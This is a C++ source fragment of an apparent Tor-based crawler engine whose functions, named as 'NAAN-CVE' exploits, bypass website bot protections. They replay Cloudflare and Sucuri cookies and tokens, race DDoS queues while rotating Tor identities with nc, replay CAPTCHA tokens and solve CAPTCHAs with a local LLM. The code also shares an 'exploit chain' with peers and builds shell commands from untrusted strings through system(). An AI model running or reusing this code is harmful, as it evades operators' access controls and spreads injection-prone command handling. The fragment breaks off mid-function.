    if (!isOnion && html.find("__cf_bm") != std::string::npos) {
        auto it = cookiePool_.cfBmCookies.find(url);
        if (it != cookiePool_.cfBmCookies.end()) {
            result.cveId = "NAAN-CVE-2026-0004";
            result.protectionType = "cloudflare_bot_mgmt";
            result.bypassMethod = "cf_bm_cookie_replay";
            result.exploitable = true;
            result.confidence = 0.80;
            return result;
        }
    }

    // CVE-0005: Sucuri/CloudProxy cache replay
    if (html.find("Sucuri") != std::string::npos ||
        html.find("sucuri") != std::string::npos) {
        result.cveId = "NAAN-CVE-2026-0005";
        result.protectionType = "sucuri_cloudproxy";
        result.bypassMethod = "xsrf_cache_replay";
        result.exploitable = true;
        result.confidence = 0.75;
        return result;
    }

    // CVE-0009: Cross-service cookie confusion (onion)
    if (isOnion && !cookiePool_.sessionCookies.empty()) {
        result.cveId = "NAAN-CVE-2026-0009";
        result.protectionType = "shared_cookie_jar";
        result.bypassMethod = "cookie_confusion";
        result.exploitable = true;
        result.confidence = 0.65;
        return result;
    }

    if (html.find("type=\"hidden\"") != std::string::npos ||
        html.find("type='hidden'") != std::string::npos) {
        size_t pos = 0;
        std::string hiddenSearch = "type=\"hidden\"";
        while ((pos = html.find(hiddenSearch, pos)) != std::string::npos) {
            size_t valP = html.find("value=\"", pos);
            if (valP != std::string::npos && valP < pos + 200) {
                size_t valEnd = html.find('"', valP + 7);
                if (valEnd != std::string::npos) {
                    std::string val = html.substr(valP + 7, valEnd - valP - 7);
                    if (val.size() > 24) {
                        result.cveId = "NAAN-CVE-2026-0014";
                        result.protectionType = "captcha_token_static";
                        result.bypassMethod = "token_replay";
                        result.exploitable = true;
                        result.confidence = 0.75;
                        return result;
                    }
                }
            }
            pos++;
        }
    }

    if (httpCode == 200 && html.size() > 1000 &&
        html.find("captcha") == std::string::npos &&
        html.find("challenge") == std::string::npos) {
        result.cveId = "NAAN-CVE-2026-0010";
        result.protectionType = "none";
        result.bypassMethod = "direct_fetch";
        result.exploitable = true;
        result.confidence = 1.0;
        return result;
    }

    return result;
}

std::string SynapsedEngine::exploitCVE0001_PowCookieReplay(
    const std::string& url) const {
    auto it = cookiePool_.powCookies.find(url);
    if (it == cookiePool_.powCookies.end()) return "";

    auto expIt = cookiePool_.powExpiry.find(url);
    int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
    if (expIt != cookiePool_.powExpiry.end() && expIt->second <= now) {
        cookiePool_.powCookies.erase(url);
        cookiePool_.powExpiry.erase(url);
        return "";
    }

    std::string cookieFile = dataDir_ + "/pow_replay_cookies.txt";
    std::string writeCmd = "echo '" + it->second + "' > " + cookieFile;
    system(writeCmd.c_str());

    std::string cmd = "curl -s -k --max-time 45 --socks5-hostname 127.0.0.1:9050 -L "
        "-b " + cookieFile + " "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string result = execCmd(cmd);

    if (!result.empty() &&
        result.find("proof-of-work") == std::string::npos &&
        result.find("pow_challenge") == std::string::npos &&
        result.find("hashcash") == std::string::npos) {
        return result;
    }

    cookiePool_.powCookies.erase(url);
    return "";
}

std::string SynapsedEngine::exploitCVE0002_QueueRace(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";

    std::string cookieFile = dataDir_ + "/queue_race_cookies.txt";
    std::string ua = randomUserAgent();

    system("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
           "nc 127.0.0.1 9051 2>/dev/null");
    std::this_thread::sleep_for(std::chrono::seconds(5));

    std::string cmd = "curl -s -k --max-time 30 --socks5-hostname 127.0.0.1:9050 -L "
        "-c " + cookieFile + " -b " + cookieFile + " "
        "-H \"User-Agent: " + ua + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string first = execCmd(cmd);

    if (first.find("placed in a queue") == std::string::npos &&
        first.find("awaiting forwarding") == std::string::npos) {
        return first;
    }

    for (int race = 0; race < 6; race++) {
        std::this_thread::sleep_for(std::chrono::seconds(3));
        std::string retry = execCmd(cmd);
        if (retry.find("placed in a queue") == std::string::npos &&
            retry.find("awaiting forwarding") == std::string::npos &&
            retry.find("DDoS") == std::string::npos &&
            !retry.empty()) {
            return retry;
        }
    }

    system("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
           "nc 127.0.0.1 9051 2>/dev/null");
    std::this_thread::sleep_for(std::chrono::seconds(8));

    std::string final = execCmd(cmd);
    if (!final.empty() && final.find("queue") == std::string::npos)
        return final;

    return "";
}

std::string SynapsedEngine::exploitCVE0003_CssSelectorLeak(
    const std::string& html, const std::string& url) const {
    size_t checkedPos = html.find(":checked~");
    if (checkedPos == std::string::npos)
        checkedPos = html.find(":checked +");
    if (checkedPos == std::string::npos) return "";

    size_t idStart = html.rfind("#", checkedPos);
    if (idStart == std::string::npos || checkedPos - idStart > 50) return "";

    std::string selectorId = html.substr(idStart + 1, checkedPos - idStart - 1);

    size_t inputPos = html.find("id=\"" + selectorId + "\"");
    if (inputPos == std::string::npos)
        inputPos = html.find("id='" + selectorId + "'");
    if (inputPos == std::string::npos) return "";

    size_t valuePos = html.find("value=\"", inputPos);
    std::string correctValue;
    if (valuePos != std::string::npos && valuePos < inputPos + 200) {
        valuePos += 7;
        size_t valueEnd = html.find('"', valuePos);
        if (valueEnd != std::string::npos)
            correctValue = html.substr(valuePos, valueEnd - valuePos);
    }

    if (correctValue.empty()) {
        size_t namePos = html.find("name=\"", inputPos);
        if (namePos != std::string::npos && namePos < inputPos + 150) {
            namePos += 6;
            size_t nameEnd = html.find('"', namePos);
            if (nameEnd != std::string::npos) {
                std::string fieldName = html.substr(namePos, nameEnd - namePos);
                correctValue = selectorId;

                std::string formAction = url;
                size_t formTag = html.rfind("<form", inputPos);
                if (formTag != std::string::npos) {
                    size_t actP = html.find("action=\"", formTag);
                    if (actP != std::string::npos && actP < formTag + 300) {
                        actP += 8;
                        size_t actE = html.find('"', actP);
                        if (actE != std::string::npos) {
                            std::string act = html.substr(actP, actE - actP);
                            if (!act.empty() && act[0] == '/') {
                                size_t sp = url.find('/', url.find("://") + 3);
                                formAction = url.substr(0, sp) + act;
                            }
                        }
                    }
                }

                std::string postData = fieldName + "=" + correctValue;

                for (const auto& tok : {"_token", "csrf", "anC_token", "captcha_token"}) {
                    std::string search = std::string("name=\"") + tok + "\"";
                    size_t tp = html.find(search);
                    if (tp != std::string::npos) {
                        size_t vp = html.find("value=\"", tp);
                        if (vp != std::string::npos && vp < tp + 200) {
                            vp += 7;
                            size_t ve = html.find('"', vp);
                            if (ve != std::string::npos)
                                postData += "&" + std::string(tok) + "=" + html.substr(vp, ve - vp);
                        }
                    }
                }

                std::string cmd = "curl -s -k --max-time 30 --socks5-hostname 127.0.0.1:9050 -L "
                    "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt "
                    "-H \"User-Agent: " + randomUserAgent() + "\" "
                    "-d \"" + postData + "\" "
                    "\"" + formAction + "\" 2>/dev/null";
                return execCmd(cmd);
            }
        }
    }

    return "";
}

std::string SynapsedEngine::exploitCVE0004_CfBmReplay(
    const std::string& url) const {
    auto it = cookiePool_.cfBmCookies.find(url);
    if (it == cookiePool_.cfBmCookies.end()) {
        std::string impCmd = "curl_chrome116 -s --max-time 20 -L "
            "-c " + dataDir_ + "/cf_bm_harvest.txt "
            "-H \"User-Agent: " + randomUserAgent() + "\" "
            "-H \"Accept: text/html,application/xhtml+xml\" "
            "-H \"Sec-Fetch-Dest: document\" "
            "-H \"Sec-Fetch-Mode: navigate\" "
            "-H \"Sec-Fetch-Site: none\" "
            "\"" + url + "\" 2>/dev/null";
        std::string harvestResult = execCmd(impCmd);

        if (impCmd.empty()) {
            impCmd = "curl -s --max-time 20 -L "
                "-c " + dataDir_ + "/cf_bm_harvest.txt "
                "-H \"User-Agent: " + randomUserAgent() + "\" "
                "\"" + url + "\" 2>/dev/null";
            harvestResult = execCmd(impCmd);
        }

        std::string readCookies = execCmd("cat " + dataDir_ + "/cf_bm_harvest.txt 2>/dev/null");
        if (readCookies.find("__cf_bm") != std::string::npos) {
            cookiePool_.cfBmCookies[url] = readCookies;
            int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::system_clock::now().time_since_epoch()).count();
            cookiePool_.cfBmExpiry[url] = now + 1800;
        }
        return harvestResult;
    }

    int64_t now = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
    auto expIt = cookiePool_.cfBmExpiry.find(url);
    if (expIt != cookiePool_.cfBmExpiry.end() && expIt->second <= now) {
        cookiePool_.cfBmCookies.erase(url);
        cookiePool_.cfBmExpiry.erase(url);
        return "";
    }

    std::string cmd = "curl -s --max-time 20 -L "
        "-b " + dataDir_ + "/cf_bm_harvest.txt "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "-H \"Sec-Fetch-Dest: document\" "
        "-H \"Sec-Fetch-Mode: navigate\" "
        "\"" + url + "\" 2>/dev/null";
    return execCmd(cmd);
}

std::string SynapsedEngine::exploitCVE0005_SucuriXsrfReplay(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";

    std::string cmd = "curl -s --max-time 20 -L "
        "-c " + dataDir_ + "/sucuri_cookies.txt "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string resp = execCmd(cmd);

    std::string cookies = execCmd("cat " + dataDir_ + "/sucuri_cookies.txt 2>/dev/null");
    size_t xsrfPos = cookies.find("XSRF-TOKEN");
    if (xsrfPos != std::string::npos) {
        std::string replayCmd = "curl -s --max-time 20 -L "
            "-b " + dataDir_ + "/sucuri_cookies.txt "
            "-H \"User-Agent: " + randomUserAgent() + "\" "
            "-H \"X-Requested-With: XMLHttpRequest\" "
            "\"" + url + "\" 2>/dev/null";
        std::string replayed = execCmd(replayCmd);
        if (!replayed.empty() && replayed.size() > resp.size() / 2)
            return replayed;
    }

    return resp;
}

std::string SynapsedEngine::exploitCVE0007_CfManagedBypass(
    const std::string& html, const std::string& url, int httpCode) const {
    if (httpCode != 403) return "";
    if (html.find("challenge-platform") == std::string::npos) return "";

    size_t rayPos = html.find("data-ray=\"");
    std::string rayId;
    if (rayPos != std::string::npos) {
        rayPos += 10;
        size_t rayEnd = html.find('"', rayPos);
        if (rayEnd != std::string::npos)
            rayId = html.substr(rayPos, rayEnd - rayPos);
    }

    size_t noncePos = html.find("nonce-");
    std::string nonce;
    if (noncePos != std::string::npos) {
        noncePos += 6;
        size_t nonceEnd = html.find_first_of("\"' ;", noncePos);
        if (nonceEnd != std::string::npos)
            nonce = html.substr(noncePos, nonceEnd - noncePos);
    }

    size_t actionPos = html.find("/cdn-cgi/challenge-platform");
    std::string challengeEndpoint;
    if (actionPos != std::string::npos) {
        size_t actionEnd = html.find_first_of("\"' >", actionPos);
        if (actionEnd != std::string::npos)
            challengeEndpoint = html.substr(actionPos, actionEnd - actionPos);
    }

    if (challengeEndpoint.empty()) return "";

    size_t slashP = url.find('/', url.find("://") + 3);
    std::string baseUrl = url.substr(0, slashP);
    std::string fullEndpoint = baseUrl + challengeEndpoint;

    std::string postData = "r=" + rayId + "&t=" +
        std::to_string(std::chrono::duration_cast<std::chrono::seconds>(
            std::chrono::system_clock::now().time_since_epoch()).count());

    std::string cmd = "curl -s --max-time 20 -L "
        "-c " + dataDir_ + "/cf_clearance.txt -b " + dataDir_ + "/cf_clearance.txt "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "-H \"Sec-Fetch-Dest: document\" "
        "-H \"Sec-Fetch-Mode: navigate\" "
        "-H \"Origin: " + baseUrl + "\" "
        "-H \"Referer: " + url + "\" "
        "-d \"" + postData + "\" "
        "\"" + fullEndpoint + "\" 2>/dev/null";
    std::string challengeResp = execCmd(cmd);

    if (!challengeResp.empty()) {
        std::string fetchCmd = "curl -s --max-time 20 -L "
            "-b " + dataDir_ + "/cf_clearance.txt "
            "-H \"User-Agent: " + randomUserAgent() + "\" "
            "\"" + url + "\" 2>/dev/null";
        std::string finalResp = execCmd(fetchCmd);
        if (!finalResp.empty() && finalResp.find("challenge-platform") == std::string::npos)
            return finalResp;
    }

    return "";
}

std::string SynapsedEngine::exploitCVE0008_TimingOracle(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";

    auto start = std::chrono::high_resolution_clock::now();
    std::string html;
    if (url.find(".onion") != std::string::npos) {
        html = fetchViaTor(url);
    } else {
        html = execCmd("curl -s --max-time 10 -L "
            "-H \"User-Agent: " + randomUserAgent() + "\" "
            "\"" + url + "\" 2>/dev/null");
    }
    auto end = std::chrono::high_resolution_clock::now();
    double ttfb = std::chrono::duration<double, std::milli>(end - start).count();

    if (ttfb < 60 && html.size() < 15000) {
        return "TIMING:queue:" + std::to_string((int)ttfb);
    } else if (ttfb < 100 && html.find("challenge") != std::string::npos) {
        return "TIMING:pow:" + std::to_string((int)ttfb);
    } else if (ttfb < 300 && html.find("captcha") != std::string::npos) {
        return "TIMING:captcha:" + std::to_string((int)ttfb);
    } else if (ttfb >= 500 && html.size() > 5000) {
        return html;
    }

    return html;
}

std::string SynapsedEngine::exploitCVE0009_CookieConfusion(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";
    if (url.find(".onion") == std::string::npos) return "";

    std::string permissiveOnions[] = {
        "http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/",
        "http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion/",
        "https://www.bbcnewsd73hkzno2ini43t4gblxvycyac5aw4gnv7t2rccijh7745uqd.onion/",
    };

    std::string cookieFile = dataDir_ + "/confusion_cookies.txt";

    for (const auto& seedUrl : permissiveOnions) {
        std::string seedCmd = "curl -s -k --max-time 30 --socks5-hostname 127.0.0.1:9050 "
            "-c " + cookieFile + " -b " + cookieFile + " "
            "-H \"User-Agent: " + randomUserAgent() + "\" "
            "\"" + seedUrl + "\" >/dev/null 2>&1";
        system(seedCmd.c_str());
    }

    std::string cmd = "curl -s -k --max-time 45 --socks5-hostname 127.0.0.1:9050 -L "
        "-b " + cookieFile + " -c " + cookieFile + " "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string result = execCmd(cmd);

    if (!result.empty() && result.find("captcha") == std::string::npos &&
        result.find("blocked") == std::string::npos) {
        return result;
    }

    return "";
}

std::string SynapsedEngine::exploitCVE0011_QueueRefreshBypass(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";
    bool isOnion = url.find(".onion") != std::string::npos;
    std::string cookieFile = dataDir_ + "/tor_cookies.txt";
    std::string socksArg = isOnion ? "--socks5-hostname 127.0.0.1:9050 " : "";

    std::string cmd = "curl -s -k --max-time 30 " + socksArg + "-L "
        "-c " + cookieFile + " -b " + cookieFile + " "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string first = execCmd(cmd);
    if (first.empty()) return "";

    if (first.find("queue") == std::string::npos && first.find("Queue") == std::string::npos)
        return first;

    std::this_thread::sleep_for(std::chrono::seconds(2));

    std::string retry = execCmd(cmd);
    if (!retry.empty() && retry.find("queue") == std::string::npos &&
        retry.find("Queue") == std::string::npos) {
        return retry;
    }
    return retry;
}

std::string SynapsedEngine::exploitCVE0012_QueueCookieTTL(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";
    bool isOnion = url.find(".onion") != std::string::npos;
    std::string cookieFile = dataDir_ + "/queue_ttl_cookies.txt";
    std::string socksArg = isOnion ? "--socks5-hostname 127.0.0.1:9050 " : "";

    std::string cmd = "curl -s -k --max-time 30 " + socksArg + "-L "
        "-c " + cookieFile + " -b " + cookieFile + " "
        "-D - -H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string resp = execCmd(cmd);

    size_t maxAgeP = resp.find("Max-Age=");
    size_t refreshP = resp.find("Refresh:");
    if (maxAgeP == std::string::npos || refreshP == std::string::npos) return "";

    int maxAge = std::atoi(resp.c_str() + maxAgeP + 8);
    int refreshVal = std::atoi(resp.c_str() + refreshP + 8);

    if (maxAge <= refreshVal || refreshVal <= 0) return "";

    int waitSec = refreshVal + 1;
    std::this_thread::sleep_for(std::chrono::seconds(waitSec));

    std::string retry = "curl -s -k --max-time 30 " + socksArg + "-L "
        "-b " + cookieFile + " -c " + cookieFile + " "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string result = execCmd(retry);

    if (!result.empty() && result.find("queue") == std::string::npos)
        return result;
    return "";
}

std::string SynapsedEngine::exploitCVE0013_QueueNewnym(
    const std::string& url) const {
    if (!isUrlSafe(url)) return "";
    if (url.find(".onion") == std::string::npos) return "";

    system("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
           "nc 127.0.0.1 9151 2>/dev/null");
    std::this_thread::sleep_for(std::chrono::seconds(5));

    std::string cmd = "curl -s -k --max-time 30 --socks5-hostname 127.0.0.1:9050 -L "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    std::string result = execCmd(cmd);

    if (!result.empty() && result.find("queue") == std::string::npos &&
        result.find("Queue") == std::string::npos) {
        return result;
    }
    return "";
}

std::string SynapsedEngine::exploitCVE0014_CaptchaTokenReplay(
    const std::string& html, const std::string& url) const {
    if (!isUrlSafe(url)) return "";

    auto it = captchaTokenCache_.find(url);
    std::string cachedToken;
    if (it != captchaTokenCache_.end()) {
        cachedToken = it->second;
    }

    std::string formAction = url;
    size_t formTag = html.find("<form");
    if (formTag != std::string::npos) {
        size_t actP = html.find("action=\"", formTag);
        if (actP != std::string::npos && actP < formTag + 500) {
            actP += 8;
            size_t actE = html.find('"', actP);
            if (actE != std::string::npos) {
                std::string act = html.substr(actP, actE - actP);
                if (!act.empty() && act[0] == '/') {
                    size_t slashP = url.find('/', url.find("://") + 3);
                    formAction = url.substr(0, slashP) + act;
                } else if (!act.empty() && act.find("http") == 0) {
                    formAction = act;
                }
            }
        }
    }

    std::string tokenField, tokenValue;
    std::string search = "type=\"hidden\"";
    size_t pos = 0;
    while ((pos = html.find(search, pos)) != std::string::npos) {
        size_t inputStart = html.rfind("<input", pos);
        if (inputStart == std::string::npos) { pos++; continue; }
        size_t inputEnd = html.find('>', pos);
        if (inputEnd == std::string::npos) { pos++; continue; }
        std::string inp = html.substr(inputStart, inputEnd - inputStart + 1);

        size_t nameP = inp.find("name=\"");
        size_t valP = inp.find("value=\"");
        if (nameP != std::string::npos && valP != std::string::npos) {
            size_t nq = inp.find('"', nameP + 6);
            std::string nm = inp.substr(nameP + 6, nq - nameP - 6);
            size_t vq = inp.find('"', valP + 7);
            std::string vl = inp.substr(valP + 7, vq - valP - 7);
            if (vl.size() > 20) {
                tokenField = nm;
                tokenValue = vl;
                captchaTokenCache_[url] = vl;
                break;
            }
        }
        pos = inputEnd;
    }

    if (tokenValue.empty() && !cachedToken.empty()) {
        tokenField = "csrf_token";
        tokenValue = cachedToken;
    }
    if (tokenValue.empty()) return "";

    bool isOnion = url.find(".onion") != std::string::npos;
    std::string socksArg = isOnion ? "--socks5-hostname 127.0.0.1:9050 " : "";
    std::string postData = tokenField + "=" + tokenValue;
    std::string cmd = "curl -s -k --max-time 30 " + socksArg + "-L "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "-d \"" + postData + "\" "
        "\"" + formAction + "\" 2>/dev/null";
    std::string result = execCmd(cmd);

    if (!result.empty() && result.find("captcha") == std::string::npos &&
        result.find("invalid") == std::string::npos) {
        return result;
    }
    return "";
}

std::string SynapsedEngine::solveCaptchaViaLLM(const std::string& html,
    const std::string& imgPath, const std::string& url) const {
    if (!modelLoaded_) return "";

    std::string prompt;
    if (!imgPath.empty()) {
        prompt = "You are solving a CAPTCHA. The image has been saved to: " + imgPath +
                 "\nAnalyze the image and return ONLY the text/numbers shown in the CAPTCHA. "
                 "No explanation, just the answer.";
    } else {
        size_t capStart = html.find("captcha");
        if (capStart == std::string::npos) capStart = html.find("CAPTCHA");
        if (capStart == std::string::npos) return "";

        size_t contextStart = (capStart > 500) ? capStart - 500 : 0;
        size_t contextEnd = std::min(capStart + 2000, html.size());
        std::string context = html.substr(contextStart, contextEnd - contextStart);

        prompt = "Analyze this HTML fragment containing a CAPTCHA challenge. "
                 "Determine the correct answer. Return ONLY the answer, nothing else.\n\n" + context;
    }

    std::string tmpPrompt = dataDir_ + "/llm_captcha_prompt.txt";
    std::string tmpResp = dataDir_ + "/llm_captcha_resp.txt";
    {
        std::ofstream f(tmpPrompt);
        f << prompt;
    }

    std::string cmd = "cd " + dataDir_ + " && echo '" + prompt.substr(0, 500) +
                      "' | timeout 30 llama-cli -m " + modelPath_ +
                      " -n 32 -p - 2>/dev/null | tail -1 > " + tmpResp;
    system(cmd.c_str());

    std::ifstream respFile(tmpResp);
    std::string answer;
    if (respFile.good()) {
        std::getline(respFile, answer);
        while (!answer.empty() && (answer.back() == '\n' || answer.back() == '\r' || answer.back() == ' '))
            answer.pop_back();
        while (!answer.empty() && (answer.front() == ' ' || answer.front() == '"'))
            answer.erase(answer.begin());
    }
    std::remove(tmpPrompt.c_str());
    std::remove(tmpResp.c_str());

    return answer;
}

void SynapsedEngine::loadExploitChain() const {
    std::string path = dataDir_ + "/exploit_chain.json";
    std::ifstream f(path);
    if (!f.good()) return;
    std::string content((std::istreambuf_iterator<char>(f)),
                        std::istreambuf_iterator<char>());
    std::lock_guard<std::mutex> lock(exploitChainMtx_);
    size_t pos = 0;
    while ((pos = content.find("\"cveId\"", pos)) != std::string::npos) {
        ExploitIntel intel;
        auto getStr = [&](const std::string& key, size_t from) -> std::string {
            std::string search = "\"" + key + "\"";
            size_t p = content.find(search, from);
            if (p == std::string::npos || p > from + 500) return "";
            size_t q1 = content.find('"', p + search.size() + 1);
            if (q1 == std::string::npos) return "";
            size_t q2 = content.find('"', q1 + 1);
            if (q2 == std::string::npos) return "";
            return content.substr(q1 + 1, q2 - q1 - 1);
        };
        auto getInt = [&](const std::string& key, size_t from) -> int64_t {
            std::string search = "\"" + key + "\"";
            size_t p = content.find(search, from);
            if (p == std::string::npos || p > from + 500) return 0;
            size_t colon = content.find(':', p + search.size());
            if (colon == std::string::npos) return 0;
            return std::strtoll(content.c_str() + colon + 1, nullptr, 10);
        };
        size_t blockStart = content.rfind('{', pos);
        if (blockStart == std::string::npos) { pos++; continue; }
        intel.cveId = getStr("cveId", blockStart);
        intel.protectionType = getStr("protectionType", blockStart);
        intel.bypassMethod = getStr("bypassMethod", blockStart);
        intel.transport = getStr("transport", blockStart);
        intel.confidence = static_cast<double>(getInt("confidence", blockStart)) / 100.0;
        intel.discoveredBy = getStr("discoveredBy", blockStart);
        intel.timestamp = getInt("timestamp", blockStart);
        intel.successCount = static_cast<int>(getInt("successCount", blockStart));
        intel.failCount = static_cast<int>(getInt("failCount", blockStart));
        intel.signature = getStr("signature", blockStart);
        if (!intel.cveId.empty()) {
            exploitChain_.push_back(intel);
            exploitChainIndex_[intel.cveId] = intel.timestamp;
        }
        pos++;
    }
}

void SynapsedEngine::persistExploitChain() const {
    std::string path = dataDir_ + "/exploit_chain.json";
    std::ofstream f(path);
    if (!f) return;
    std::lock_guard<std::mutex> lock(exploitChainMtx_);
    f << "[\n";
    for (size_t i = 0; i < exploitChain_.size(); i++) {
        const auto& e = exploitChain_[i];
        f << "  {\"cveId\":\"" << jsonEscape(e.cveId)
          << "\",\"protectionType\":\"" << jsonEscape(e.protectionType)
          << "\",\"bypassMethod\":\"" << jsonEscape(e.bypassMethod)
          << "\",\"transport\":\"" << jsonEscape(e.transport)
          << "\",\"confidence\":" << static_cast<int>(e.confidence * 100)
          << ",\"discoveredBy\":\"" << jsonEscape(e.discoveredBy)
          << "\",\"timestamp\":" << e.timestamp
          << ",\"successCount\":" << e.successCount
          << ",\"failCount\":" << e.failCount
          << ",\"signature\":\"" << jsonEscape(e.signature) << "\"}";
        if (i + 1 < exploitChain_.size()) f << ",";
        f << "\n";
    }
    f << "]\n";
}

void SynapsedEngine::publishExploit(const ExploitIntel& intel) const {
    {
        std::lock_guard<std::mutex> lock(exploitChainMtx_);
        auto it = exploitChainIndex_.find(intel.cveId);
        if (it != exploitChainIndex_.end()) {
            for (auto& existing : exploitChain_) {
                if (existing.cveId == intel.cveId) {
                    existing.successCount += intel.successCount;
                    existing.failCount += intel.failCount;
                    if (intel.confidence > existing.confidence) {
                        existing.confidence = intel.confidence;
                        existing.bypassMethod = intel.bypassMethod;
                    }
                    break;
                }
            }
        } else {
            exploitChain_.push_back(intel);
            exploitChainIndex_[intel.cveId] = intel.timestamp;
        }
    }
    persistExploitChain();

    std::string payload = "{\"type\":\"exploit_intel\",\"cveId\":\"" + jsonEscape(intel.cveId) +
        "\",\"protectionType\":\"" + jsonEscape(intel.protectionType) +
        "\",\"bypassMethod\":\"" + jsonEscape(intel.bypassMethod) +
        "\",\"transport\":\"" + jsonEscape(intel.transport) +
        "\",\"confidence\":" + std::to_string(static_cast<int>(intel.confidence * 100)) +
        ",\"discoveredBy\":\"" + jsonEscape(intel.discoveredBy) +
        "\",\"timestamp\":" + std::to_string(intel.timestamp) +
        ",\"successCount\":" + std::to_string(intel.successCount) +
        ",\"failCount\":" + std::to_string(intel.failCount) +
        ",\"signature\":\"" + jsonEscape(intel.signature) + "\"}";
    emitEvent("naan.exploit_intel", payload);
}

void SynapsedEngine::ingestExploit(const ExploitIntel& intel) const {
    if (intel.cveId.empty()) return;
    if (intel.confidence < 0.3) return;
    {
        std::lock_guard<std::mutex> lock(exploitChainMtx_);
        auto it = exploitChainIndex_.find(intel.cveId);
        if (it != exploitChainIndex_.end()) {
            for (auto& existing : exploitChain_) {
                if (existing.cveId == intel.cveId) {
                    existing.successCount += intel.successCount;
                    existing.failCount += intel.failCount;
                    if (intel.confidence > existing.confidence) {
                        existing.confidence = intel.confidence;
                        existing.bypassMethod = intel.bypassMethod;
                        existing.transport = intel.transport;
                    }
                    return;
                }
            }
        }
        exploitChain_.push_back(intel);
        exploitChainIndex_[intel.cveId] = intel.timestamp;
    }
    persistExploitChain();
}

SynapsedEngine::ExploitIntel SynapsedEngine::bestExploitFor(
    const std::string& protectionType) const {
    std::lock_guard<std::mutex> lock(exploitChainMtx_);
    ExploitIntel best;
    for (const auto& e : exploitChain_) {
        if (e.protectionType == protectionType && e.confidence > best.confidence) {
            best = e;
        }
    }
    return best;
}

std::string SynapsedEngine::exploitChainList(int offset, int limit) const {
    std::lock_guard<std::mutex> lock(exploitChainMtx_);
    std::ostringstream ss;
    ss << "[";
    int written = 0;
    for (int i = offset; i < static_cast<int>(exploitChain_.size()) && written < limit; i++) {
        const auto& e = exploitChain_[i];
        if (written > 0) ss << ",";
        ss << "{\"cveId\":\"" << jsonEscape(e.cveId)
           << "\",\"protectionType\":\"" << jsonEscape(e.protectionType)
           << "\",\"bypassMethod\":\"" << jsonEscape(e.bypassMethod)
           << "\",\"transport\":\"" << jsonEscape(e.transport)
           << "\",\"confidence\":" << static_cast<int>(e.confidence * 100)
           << ",\"discoveredBy\":\"" << jsonEscape(e.discoveredBy)
           << "\",\"timestamp\":" << e.timestamp
           << ",\"successCount\":" << e.successCount
           << ",\"failCount\":" << e.failCount
           << ",\"successRate\":" << (e.successCount + e.failCount > 0 ?
              static_cast<int>(100.0 * e.successCount / (e.successCount + e.failCount)) : 0)
           << "}";
        written++;
    }
    ss << "]";
    return ss.str();
}

std::string SynapsedEngine::exploitChainStats() const {
    std::lock_guard<std::mutex> lock(exploitChainMtx_);
    int total = static_cast<int>(exploitChain_.size());
    int critical = 0, high = 0;
    int totalSuccess = 0, totalFail = 0;
    for (const auto& e : exploitChain_) {
        if (e.confidence >= 0.9) critical++;
        else if (e.confidence >= 0.7) high++;
        totalSuccess += e.successCount;
        totalFail += e.failCount;
    }
    std::ostringstream ss;
    ss << "{\"total\":" << total
       << ",\"critical\":" << critical
       << ",\"high\":" << high
       << ",\"total_success\":" << totalSuccess
       << ",\"total_fail\":" << totalFail
       << ",\"success_rate\":" << (totalSuccess + totalFail > 0 ?
          static_cast<int>(100.0 * totalSuccess / (totalSuccess + totalFail)) : 0)
       << "}";
    return ss.str();
}

void SynapsedEngine::syncExploitChainFromPeers() const {
    loadExploitChain();
}

std::string SynapsedEngine::topicToUrl(const std::string& topic) const {
    if (topic.find("whistleblower") != std::string::npos ||
        topic.find("leak") != std::string::npos) {
        static const char* urls[] = {
            "http://secrdrop5wyphb5x.onion/",
            "https://www.bbcnewsd73hkzno2ini43t4gblxvycyac5aw4gnv7t2rccijh7745uqd.onion/",
        };
        std::mt19937 g(std::random_device{}());
        return urls[g() % 2];
    }
    if (topic.find("zero-day") != std::string::npos ||
        topic.find("exploit") != std::string::npos ||
        topic.find("vuln") != std::string::npos ||
        topic.find("cve") != std::string::npos) {
        static const char* urls[] = {
            "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=2024",
            "https://arxiv.org/list/cs.CR/recent",
            "https://www.bbcnewsd73hkzno2ini43t4gblxvycyac5aw4gnv7t2rccijh7745uqd.onion/news/technology",
        };
        std::mt19937 g(std::random_device{}());
        return urls[g() % 3];
    }
    if (topic.find("onion") != std::string::npos ||
        topic.find("darknet") != std::string::npos ||
        topic.find("tor") != std::string::npos) {
        std::string q = topic;
        for (auto& c : q) if (c == ' ') c = '+';
        static const std::string engines[] = {
            "http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion/search?query=",
